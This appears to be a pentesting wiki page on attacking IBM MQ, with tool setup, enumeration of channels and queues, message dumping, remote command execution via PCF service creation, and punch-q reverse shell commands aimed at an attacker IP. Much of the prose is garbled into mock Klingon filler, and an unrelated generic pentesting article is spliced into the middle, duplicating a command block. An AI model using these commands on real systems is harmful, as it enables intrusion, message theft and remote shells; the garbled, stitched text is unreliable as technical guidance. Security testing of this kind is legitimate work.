# 1414 - Pentesting IBM MQ

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!HackTricks AWS Red Team Expert</strong></a><strong>!</strong></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Basic information

IBM MQ is an IBM technology to manage message queues. As other **message broker** technologies, it is dedicated to receive, store, process and classify information between producers and consumers.

By default, **it exposes IBM MQ TCP port 1414**.
Sometimes, HTTP REST API can be exposed on port **9443**.
Metrics (Prometheus) could also be accessed from TCP port **9157**.

The IBM MQ TCP port 1414 can be used to manipulate messages, queues, channels, ... but **also to control the instance**.

IBM provides a large technical documentation available on [https://www.ibm.com/docs/en/ibm-mq](https://www.ibm.com/docs/en/ibm-mq).

## Tools

A suggested tool for easy exploitation is **[punch-q](https://github.com/sensepost/punch-q)**, with Docker usage. The tool is actively using the Python library `pymqi`.

For a more manual approach, use the Python library **[pymqi](https://github.com/dsuch/pymqi)**. [IBM MQ dependencies](https://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&product=ibm/WebSphere/WebSphere+MQ&release=9.0.0.4&platform=All&function=fixId&fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA&useReleaseAsTarget=true&includeSupersedes=0&source=fc) are needed.

### Installing pymqi

**IBM MQ dependencies** needs to be installed and loaded:

1. Create an account (IBMid) on [https://login.ibm.com/](https://login.ibm.com/).
2. Download IBM MQ libraries from [https://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&product=ibm/WebSphere/WebSphere+MQ&release=9.0.0.4&platform=All&function=fixId&fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA&useReleaseAsTarget=true&includeSupersedes=0&source=fc](https://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&product=ibm/WebSphere/WebSphere+MQ&release=9.0.0.4&platform=All&function=fixId&fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA&useReleaseAsTarget=true&includeSupersedes=0&source=fc). For Linux x86_64 it is **9.0.0.4-IBM-MQC-LinuxX64.tar.gz**.
3. Decompress (`tar xvzf 9.0.0.4-IBM-MQC-LinuxX64.tar.gz`).
4. Run `sudo ./mqlicense.sh` to accept licenses terms.

>If you are under Kali Linux, modify the file `mqlicense.sh`: remove/comment the following lines (between lines 105-110):
>
>```bash
>if [ ${BUILD_PLATFORM} != `uname`_`uname ${UNAME_FLAG}` ]
>  then
>    echo "ERROR: This package is incompatible with this system"
>    echo "       This package was built for ${BUILD_PLATFORM}"
>    exit 1
>fi
>```

5. Install these packages:
```bash
sudo rpm --prefix /opt/mqm -ivh --nodeps --force-debian MQSeriesRuntime-9.0.0-4.x86_64.rpm
sudo rpm --prefix /opt/mqm -ivh --nodeps --force-debian MQSeriesClient-9.0.0-4.x86_64.rpm
sudo rpm --prefix /opt/mqm -ivh --nodeps --force-debian MQSeriesSDK-9.0.0-4.x86_64.rpm
```
6. **SoH**. QaSmoH `.so` files **LD**-Daq: `export LD_LIBRARY_PATH=/opt/mqm/lib64`, **ghorgh** **DIvI'** **tools** **vaj** **dependencies** **vaj** **run**.

**vaj**, **pymqi** [**pymqi**](https://github.com/dsuch/pymqi) **ghItlh** **project** **clone** **vaj**: **code snippets**, **constants**, ... **vaj** **install** **library** **pip** **vaj**: `pip install pymqi`.

### **punch-q** **vaj**

#### **Docker** **vaj**

**vaj**: `sudo docker run --rm -ti leonjza/punch-q`.

#### **Docker** **vaj** **ghItlh**

**punch-q** [**punch-q**](https://github.com/sensepost/punch-q) **ghItlh** **project** **clone** **vaj** **vaj** **readme** **install** (`pip install -r requirements.txt && python3 setup.py install`).

**vaj**, **punch-q** **command** **vaj** **vaj**.

## **Enumeration**

**punch-q** **pymqi** **ghItlh** **queue manager name**, **users**, **channels**, **queues** **vaj** **enumerate** **vaj**.
```bash
‚ùØ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 discover name
Queue Manager name: MYQUEUEMGR
```
### Channels

**punch-q** vItlhutlhla'ghach (choHwI') wordlist vItlhutlhla'ghach channels vItlhutlh. vaj vItlhutlhla'ghach:
```bash
‚ùØ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd discover channels
"DEV.ADMIN.SVRCONN" exists and was authorised.
"SYSTEM.AUTO.SVRCONN" might exist, but user was not authorised.
"SYSTEM.DEF.SVRCONN" might exist, but user was not authorised.
```
**Translation:**

**Qapla'!** QaStaHvIS IBM MQ jatlh **unauthenticated** MQ chep, 'ej `--username / --password` lo'laHbe'. Qatlh, 'ej 'oH channels vary.

vaj wej channel name (qaStaHvIS: `DEV.ADMIN.SVRCONN`), 'ej, channels 'oH enumerate.

The enumeration can basically be done with this code snippet `code/examples/dis_channels.py` from **pymqi**:
```python
import logging
import pymqi

logging.basicConfig(level=logging.INFO)

queue_manager = 'MYQUEUEMGR'
channel = 'DEV.ADMIN.SVRCONN'
host = '172.17.0.2'
port = '1414'
conn_info = '%s(%s)' % (host, port)
user = 'admin'
password = 'passw0rd'

prefix = '*'

args = {pymqi.CMQCFC.MQCACH_CHANNEL_NAME: prefix}

qmgr = pymqi.connect(queue_manager, channel, conn_info, user, password)
pcf = pymqi.PCFExecute(qmgr)

try:
response = pcf.MQCMD_INQUIRE_CHANNEL(args)
except pymqi.MQMIError as e:
if e.comp == pymqi.CMQC.MQCC_FAILED and e.reason == pymqi.CMQC.MQRC_UNKNOWN_OBJECT_NAME:
logging.info('No channels matched prefix `%s`' % prefix)
else:
raise
else:
for channel_info in response:
channel_name = channel_info[pymqi.CMQCFC.MQCACH_CHANNEL_NAME]
logging.info('Found channel `%s`' % channel_name)

qmgr.disconnect()

```
... 'punch-q' **ghItlh** DaH jImej (vItlhutlh!).
'ej vItlhutlh:
```bash
‚ùØ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN show channels -p '*'
Showing channels with prefix: "*"...

| Name                 | Type              | MCA UID | Conn Name | Xmit Queue | Description     | SSL Cipher |
|----------------------|-------------------|---------|-----------|------------|-----------------|------------|
| DEV.ADMIN.SVRCONN    | Server-connection |         |           |            |                 |            |
| DEV.APP.SVRCONN      | Server-connection | app     |           |            |                 |            |
| SYSTEM.AUTO.RECEIVER | Receiver          |         |           |            | Auto-defined by |            |
| SYSTEM.AUTO.SVRCONN  | Server-connection |         |           |            | Auto-defined by |            |
| SYSTEM.DEF.AMQP      | AMQP              |         |           |            |                 |            |
| SYSTEM.DEF.CLUSRCVR  | Cluster-receiver  |         |           |            |                 |            |
| SYSTEM.DEF.CLUSSDR   | Cluster-sender    |         |           |            |                 |            |
| SYSTEM.DEF.RECEIVER  | Receiver          |         |           |            |                 |            |
| SYSTEM.DEF.REQUESTER | Requester         |         |           |            |                 |            |
| SYSTEM.DEF.SENDER    | Sender            |         |           |            |                 |            |
| SYSTEM.DEF.SERVER    | Server            |         |           |            |                 |            |
| SYSTEM.DEF.SVRCONN   | Server-connection |         |           |            |                 |            |
| SYSTEM.DEF.CLNTCONN  | Client-connection |         |           |            |                 |            |
```
### tlhIngan Hol

**pymqi** (`dis_queues.py`) vItlhutlh **code snippet** vaj **punch-q** vItlhutlh **retrieve** **queues** **pieces of info** **permits**:
```bash
‚ùØ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN show queues -p '*'
Showing queues with prefix: "*"...
| Created   | Name                 | Type   | Usage   | Depth  | Rmt. QM | Rmt. Qu | Description                       |
|           |                      |        |         |        | GR Name | eue Nam |                                   |
|           |                      |        |         |        |         | e       |                                   |
|-----------|----------------------|--------|---------|--------|---------|---------|-----------------------------------|
| 2023-10-1 | DEV.DEAD.LETTER.QUEU | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 | E                    |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
| 2023-10-1 | DEV.QUEUE.1          | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 |                      |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
| 2023-10-1 | DEV.QUEUE.2          | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 |                      |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
| 2023-10-1 | DEV.QUEUE.3          | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 |                      |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
# Truncated
```
## Exploit

### Dump messages

*tlhIngan Hol:*

**QapHa'** 

**QapHa'** *queue(s)/channel(s)* **ghItlh** *messages* **ghItlh** *sniff* **'ej** *dump* **ghItlh** *non-destructive operation*. *Dochmey:*
```bash
‚ùØ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN messages sniff
```

```bash
‚ùØ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN messages dump
```
**jIyajbe'chugh, DaH jatlhbe'chugh vItlhutlh.**

### Code execution

> **IBM MQ** vItlhutlh Hoch **MQSC**, **PCF**, **Control Command** vItlhutlh. **IBM MQ documentation** [yIlo'laHbe'](https://www.ibm.com/docs/en/ibm-mq/9.2?topic=reference-command-sets-comparison) vItlhutlh. **PCF** (***Programmable Command Formats***) vItlhutlh **punch-q** **pymqi** vItlhutlh.
>
> **PCF commands** yIlo'laHbe':
> * [**PCF documentation**](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=reference-definitions-programmable-command-formats), je
> * [**constants**](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=constants-mqcmd-command-codes) vItlhutlh.
>
> **MQCMD_CREATE_SERVICE** vItlhutlh **command** vItlhutlh **documentation** [yIlo'laHbe'](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=formats-change-copy-create-service-multiplatforms). **StartCommand** vItlhutlh **argument** vItlhutlh **local program** vItlhutlh **instance** (example: `/bin/sh`).
>
> **Docs** vItlhutlh **warning** vItlhutlh: *"Attention: This command allows a user to run an arbitrary command with mqm authority. If granted rights to use this command, a malicious or careless user could define a service which damages your systems or data, for example, by deleting essential files."*
>
> *Note: **IBM MQ documentation** (Administration Reference) vItlhutlh **HTTP endpoint** `/admin/action/qmgr/{qmgrName}/mqsc` vItlhutlh **MQSC command** vItlhutlh **service creation** (`DEFINE SERVICE`). **This aspect** vItlhutlh **covered** vItlhutlh **yet here.***

The service creation / deletion with PCF for remote program execution can be done by **punch-q**:

**Example 1**
```bash
‚ùØ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command execute --cmd "/bin/sh" --args "-c id"
```
> In the logs of IBM MQ, you can read the command is successfully executed:
>
> ```bash
> 2023-10-10T19:13:01.713Z AMQ5030I: The Command '808544aa7fc94c48' has started. ProcessId(618). [ArithInsert1(618), CommentInsert1(808544aa7fc94c48)]
> ```
> 
> You can also enumerate existing programs on the machine (here `/bin/doesnotexist` ... does not exist):

> IBM MQ logs vItlhutlh:
>
> ```bash
> 2023-10-10T19:13:01.713Z AMQ5030I: The Command '808544aa7fc94c48' has started. ProcessId(618). [ArithInsert1(618), CommentInsert1(808544aa7fc94c48)]
> ```
> 
> machIneDaq programs vItlhutlh (ghorgh `/bin/doesnotexist` ... vItlhutlh):
```bash
‚ùØ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command execute --cmd "/bin/doesnotexist" --arg
s "whatever"
Command: /bin/doesnotexist
Arguments: -c id
Service Name: 6e3ef5af652b4436

Creating service...
Starting service...
The program '/bin/doesnotexist' is not available on the remote system.
Giving the service 0 second(s) to live...
Cleaning up service...
Done
```
**Qapla'! Qapla'!** ***(listener for reverse shell, file creation on different service, data exfiltration through network ...)*** **Qapla'!**

**Example 2**

For easy reverse shell, **punch-q** proposes also two reverse shell payloads :

* One with bash
* One with perl

*Of course you can build a custom one with the `execute` command.*

For bash:
```bash
‚ùØ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command reverse -i 192.168.0.16 -p 4444
```
# Pentesting IBM MQ

## Introduction

IBM MQ (formerly known as WebSphere MQ) is a messaging middleware that allows applications to communicate with each other using messages. It is widely used in enterprise environments for reliable and secure message delivery.

In this section, we will explore various techniques and tools for pentesting IBM MQ.

## Enumeration

### Discovering IBM MQ Instances

To begin with, we need to identify the IBM MQ instances running on the target system. We can use the following methods for enumeration:

1. **Port Scanning**: Use tools like Nmap to scan for open ports and identify if any IBM MQ ports (typically 1414) are open.

2. **Banner Grabbing**: Connect to the identified ports and retrieve the banners to determine if they belong to IBM MQ instances.

3. **DNS Enumeration**: Check for DNS records related to IBM MQ, such as `mq.example.com`, to identify potential instances.

### Enumerating Queues and Channels

Once we have identified the IBM MQ instances, the next step is to enumerate the queues and channels present in each instance. This can be done using the following techniques:

1. **IBM MQ Explorer**: Use the IBM MQ Explorer tool to connect to the instances and explore the queues and channels.

2. **MQSC Commands**: Use the MQSC (MQ Script Command) language to interact with the IBM MQ instances and retrieve information about queues and channels.

3. **IBM MQ API**: Develop custom scripts or applications using the IBM MQ API to programmatically interact with the instances and gather information.

## Exploitation

### Default Credentials

IBM MQ instances often come with default credentials that are not changed by administrators. It is important to check for default credentials and change them if found. Some common default credentials include:

- Username: `admin`, Password: `admin`
- Username: `mqm`, Password: `mqm`

### Message Tampering

IBM MQ allows messages to be sent between applications. An attacker can tamper with these messages to manipulate the behavior of the receiving application. This can lead to various security vulnerabilities, such as:

- **SQL Injection**: Injecting malicious SQL queries into messages to exploit vulnerabilities in the receiving application's database.

- **Command Injection**: Injecting malicious commands into messages to execute arbitrary commands on the receiving application's system.

### Denial of Service

By flooding an IBM MQ instance with a large number of messages, an attacker can cause a denial of service (DoS) condition. This can disrupt the normal functioning of the application relying on the IBM MQ instance.

### Message Replay

If an attacker can intercept and capture IBM MQ messages, they can replay these messages at a later time. This can lead to various security issues, such as:

- **Data Leakage**: Replaying sensitive messages containing confidential information.

- **Replay Attacks**: Replaying messages to perform unauthorized actions or bypass security controls.

## Conclusion

Pentesting IBM MQ instances is crucial to identify and mitigate potential security vulnerabilities. By following the enumeration techniques and exploiting known weaknesses, we can ensure the security of IBM MQ deployments in enterprise environments.
```bash
‚ùØ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command reverse -i 192.168.0.16 -p 4444
```
### Custom PCF

**tlhIngan Hol:**

IBM MQ documentation vItlhutlh **pymqi** python library vaj vItlhutlh **punch-q** vItlhutlh not implemented PCF command test.

**Example:**
```python
import pymqi

queue_manager = 'MYQUEUEMGR'
channel = 'DEV.ADMIN.SVRCONN'
host = '172.17.0.2'
port = '1414'
conn_info = '%s(%s)' % (host, port)
user = 'admin'
password = 'passw0rd'

qmgr = pymqi.connect(queue_manager, channel, conn_info, user, password)
pcf = pymqi.PCFExecute(qmgr)

try:
# Replace here with your custom PCF args and command
# The constants can be found in pymqi/code/pymqi/CMQCFC.py
args = {pymqi.CMQCFC.xxxxx: "value"}
response = pcf.MQCMD_CUSTOM_COMMAND(args)
except pymqi.MQMIError as e:
print("Error")
else:
# Process response

qmgr.disconnect()

```
> *Example for [`MQCMD_REFRESH_CLUSTER`](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=formats-mqcmd-refresh-cluster-refresh-cluster) (Decimal = 73). It needs the parameter `MQCA_CLUSTER_NAME` (Decimal = 2029) which can be `*` (Doc: ):*
>
> ```python
> import pymqi
>
> queue_manager = 'MYQUEUEMGR'
> channel = 'DEV.ADMIN.SVRCONN'
> host = '172.17.0.2'
> port = '1414'
> conn_info = '%s(%s)' % (host, port)
> user = 'admin'
> password = 'passw0rd'
>
> qmgr = pymqi.connect(queue_manager, channel, conn_info, user, password)
> pcf = pymqi.PCFExecute(qmgr)
>
> try:
>     args = {2029: "*"}
>     response = pcf.MQCMD_REFRESH_CLUSTER(args)
> except pymqi.MQMIError as e:
>     print("Error")
> else:
>     print(response)
>
> qmgr.disconnect()
> ```

## Testing environment

If you want to test the IBM MQ behavior and exploits, you can set up a local environment based on Docker:

1. Having an account on ibm.com and cloud.ibm.com.
2. Create a containerized IBM MQ with:
```bash
sudo docker pull icr.io/ibm-messaging/mq:9.3.2.0-r2
sudo docker run -e LICENSE=accept -e MQ_QMGR_NAME=MYQUEUEMGR -p1414:1414 -p9157:9157 -p9443:9443 --name testing-ibmmq icr.io/ibm-messaging/mq:9.3.2.0-r2
```
By default, the authentication is enabled, the username is `admin` and the password is `passw0rd` (Environment variable `MQ_ADMIN_PASSWORD`).
Here, the queue manager name has been set to `MYQUEUEMGR` (variable `MQ_QMGR_NAME`).

You should have the IBM MQ up and running with its ports exposed:
```bash
‚ùØ sudo docker ps
CONTAINER ID   IMAGE                                COMMAND                  CREATED         STATUS                    PORTS                                                                    NAMES
58ead165e2fd   icr.io/ibm-messaging/mq:9.3.2.0-r2   "runmqdevserver"         3 seconds ago   Up 3 seconds              0.0.0.0:1414->1414/tcp, 0.0.0.0:9157->9157/tcp, 0.0.0.0:9443->9443/tcp   testing-ibmmq
```
> IBM MQ docker images jatlh: https://hub.docker.com/r/ibmcom/mq/.

## References

* [mgeeky's gist - "Practical IBM MQ Penetration Testing notes"](https://gist.github.com/mgeeky/2efcd86c62f0fb3f463638911a3e89ec)
* [MQ Jumping - DEFCON 15](https://defcon.org/images/defcon-15/dc15-presentations/dc-15-ruks.pdf)
* [IBM MQ documentation](https://www.ibm.com/docs/en/ibm-mq)
